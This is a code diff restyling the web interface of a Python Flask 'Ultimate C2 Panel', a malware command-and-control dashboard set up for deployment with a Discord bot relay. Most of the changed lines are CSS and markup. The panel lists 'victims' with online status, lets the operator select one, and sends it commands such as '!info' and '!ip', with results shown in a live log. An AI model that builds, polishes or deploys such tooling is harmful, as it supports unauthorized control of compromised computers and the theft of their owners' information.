@@ -1,5 +1,5 @@
-# c2.py – Ultimate C2 Panel (professional UI)
-# Deploy on Render with environment variables BOT_TOKEN, CHANNEL_ID
+# c2.py – Ultimate C2 Panel (stunning modern UI)
+# Deploy on Render with env variables BOT_TOKEN, CHANNEL_ID
 
 import os, time, json, threading, requests
 from flask import Flask, render_template_string, request, jsonify
@@ -116,46 +116,61 @@ HTML = """
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Ultimate C2 Panel</title>
+    <title>⚡ ULTIMATE C2 PANEL</title>
     <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { background: #0a0a1a; font-family: 'Inter', 'Segoe UI', sans-serif; color: #e0e0e0; padding: 20px; }
-        .container { max-width: 1400px; margin: 0 auto; }
-        h1 { text-align: center; margin-bottom: 30px; font-size: 2rem; letter-spacing: -0.5px; background: linear-gradient(135deg, #ff6b6b, #ff8e53); -webkit-background-clip: text; background-clip: text; color: transparent; }
-        .victims-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 20px; margin-bottom: 30px; }
-        .victim-card { background: #151525; border-radius: 16px; padding: 16px; border: 1px solid #2a2a3c; transition: all 0.2s; cursor: pointer; }
-        .victim-card:hover { transform: translateY(-4px); border-color: #ff6b6b; box-shadow: 0 8px 20px rgba(0,0,0,0.3); }
-        .victim-card.active { border: 2px solid #ff6b6b; background: #1e1e30; }
-        .victim-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
-        .victim-id { font-weight: bold; font-size: 1rem; word-break: break-all; }
-        .status-badge { display: flex; align-items: center; gap: 6px; font-size: 0.75rem; }
+        body { background: #0a0c10; font-family: 'Inter', sans-serif; color: #eef2ff; padding: 24px; }
+        .container { max-width: 1600px; margin: 0 auto; }
+        /* Header */
+        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 32px; flex-wrap: wrap; gap: 16px; }
+        h1 { font-size: 28px; font-weight: 700; background: linear-gradient(135deg, #ff6b6b, #ff8e53); -webkit-background-clip: text; background-clip: text; color: transparent; letter-spacing: -0.5px; }
+        .badge { background: #1e1e2e; padding: 8px 16px; border-radius: 40px; font-size: 13px; border: 1px solid #2a2a3c; }
+        /* Victims grid */
+        .victims-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 20px; margin-bottom: 32px; }
+        .victim-card { background: #13161f; border-radius: 20px; padding: 20px; border: 1px solid #252a36; transition: all 0.2s; cursor: pointer; }
+        .victim-card:hover { transform: translateY(-4px); border-color: #ff6b6b; box-shadow: 0 12px 24px -12px rgba(0,0,0,0.5); }
+        .victim-card.active { border: 2px solid #ff6b6b; background: #181e2a; }
+        .victim-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; }
+        .victim-id { font-weight: 600; font-size: 15px; word-break: break-word; font-family: monospace; }
+        .status { display: flex; align-items: center; gap: 8px; }
         .status-dot { width: 10px; height: 10px; border-radius: 50%; }
-        .online { background: #2ecc71; box-shadow: 0 0 6px #2ecc71; }
-        .offline { background: #e74c3c; }
-        .last-seen { font-size: 0.7rem; color: #888; margin-top: 8px; }
+        .online { background: #10b981; box-shadow: 0 0 6px #10b981; }
+        .offline { background: #ef4444; }
+        .status-text { font-size: 12px; font-weight: 500; }
+        .last-seen { font-size: 11px; color: #6b7280; margin-top: 8px; }
+        /* Main panel */
         .main-panel { display: flex; gap: 24px; flex-wrap: wrap; }
-        .controls { flex: 1; min-width: 300px; background: #151525; border-radius: 20px; padding: 20px; }
-        .log { flex: 2; min-width: 400px; background: #151525; border-radius: 20px; padding: 20px; height: 65vh; overflow-y: auto; font-family: 'JetBrains Mono', monospace; font-size: 12px; }
-        .button-group { display: flex; flex-wrap: wrap; gap: 10px; margin: 20px 0; }
-        button { background: #2a2a3c; border: none; color: white; padding: 8px 14px; border-radius: 30px; cursor: pointer; transition: 0.2s; font-size: 12px; font-weight: 500; display: inline-flex; align-items: center; gap: 6px; }
-        button:hover { background: #ff6b6b; transform: scale(1.02); }
-        .cmd-row { display: flex; gap: 10px; margin: 15px 0; }
-        .cmd-row input { flex: 1; background: #1e1e2a; border: 1px solid #3a3a4f; border-radius: 30px; padding: 8px 15px; color: white; outline: none; }
-        .log p { margin: 6px 0; border-left: 3px solid #ff6b6b; padding-left: 12px; word-break: break-word; line-height: 1.4; }
-        .log pre { background: #0a0a12; padding: 8px; border-radius: 8px; overflow-x: auto; margin: 5px 0; }
-        footer { text-align: center; margin-top: 30px; font-size: 12px; color: #666; }
-        @keyframes pulse { 0% { opacity: 0.5; } 100% { opacity: 1; } }
+        .controls { flex: 1.2; min-width: 320px; background: #13161f; border-radius: 24px; padding: 24px; border: 1px solid #252a36; }
+        .log { flex: 2; min-width: 400px; background: #13161f; border-radius: 24px; padding: 20px; height: 65vh; overflow-y: auto; font-family: 'JetBrains Mono', monospace; font-size: 12px; }
+        .current-victim { background: #1e2432; border-radius: 40px; padding: 8px 16px; display: inline-block; margin-bottom: 20px; font-size: 13px; font-weight: 500; }
+        .button-group { display: flex; flex-wrap: wrap; gap: 10px; margin: 24px 0; }
+        button { background: #1e2432; border: none; color: #eef2ff; padding: 8px 16px; border-radius: 40px; cursor: pointer; transition: all 0.2s; font-size: 13px; font-weight: 500; display: inline-flex; align-items: center; gap: 6px; }
+        button:hover { background: #ff6b6b; transform: scale(1.02); color: white; }
+        .cmd-row { display: flex; gap: 12px; margin: 16px 0; }
+        .cmd-row input { flex: 1; background: #1e2432; border: 1px solid #2a3242; border-radius: 40px; padding: 10px 16px; color: white; outline: none; font-size: 13px; }
+        .cmd-row input:focus { border-color: #ff6b6b; }
+        .log p { margin: 8px 0; border-left: 3px solid #ff6b6b; padding-left: 12px; word-break: break-word; line-height: 1.5; }
+        .log pre { background: #0a0c10; padding: 10px; border-radius: 12px; overflow-x: auto; margin: 8px 0; font-size: 11px; }
+        footer { text-align: center; margin-top: 40px; font-size: 12px; color: #4b5563; }
+        @keyframes pulse { 0% { opacity: 0.6; } 100% { opacity: 1; } }
         .pulse { animation: pulse 1.5s infinite; }
+        ::-webkit-scrollbar { width: 6px; }
+        ::-webkit-scrollbar-track { background: #1e2432; border-radius: 10px; }
+        ::-webkit-scrollbar-thumb { background: #ff6b6b; border-radius: 10px; }
     </style>
 </head>
 <body>
 <div class="container">
-    <h1>🔥 ULTIMATE C2 PANEL</h1>
+    <div class="header">
+        <h1>⚡ ULTIMATE C2 PANEL</h1>
+        <div class="badge">🔗 Discord Relay | 🎯 Real‑time</div>
+    </div>
     <div class="victims-grid" id="victimsGrid"></div>
     <div class="main-panel">
         <div class="controls">
-            <div id="currentVictim" style="margin-bottom: 15px; font-weight: bold; background: #1e1e2a; padding: 8px 12px; border-radius: 30px; display: inline-block;">⚠️ No victim selected</div>
+            <div class="current-victim" id="currentVictim">⚠️ No victim selected</div>
             <div class="button-group">
                 <button onclick="sendCmd('!info')">💻 Info</button>
                 <button onclick="sendCmd('!ip')">🌐 IP</button>
@@ -194,7 +209,7 @@ HTML = """
         </div>
         <div class="log" id="logPanel"></div>
     </div>
-    <footer>Commands sent via Discord bot. Results appear here.</footer>
+    <footer>⚡ All commands sent via Discord bot | Results appear here in real time</footer>
 </div>
 <script>
     const socket = io();
@@ -218,9 +233,9 @@ HTML = """
                 card.innerHTML = `
                     <div class="victim-header">
                         <span class="victim-id">${v.id}</span>
-                        <span class="status-badge"><span class="status-dot ${v.online ? 'online' : 'offline'}"></span> ${v.online ? 'ONLINE' : 'OFFLINE'}</span>
+                        <div class="status"><span class="status-dot ${v.online ? 'online' : 'offline'}"></span><span class="status-text">${v.online ? 'ONLINE' : 'OFFLINE'}</span></div>
                     </div>
-                    <div class="last-seen">Last seen: ${new Date(v.last_seen * 1000).toLocaleTimeString()}</div>
+                    <div class="last-seen">📅 Last seen: ${new Date(v.last_seen * 1000).toLocaleString()}</div>
                 `;
                 card.onclick = () => selectVictim(v.id);
                 grid.appendChild(card);
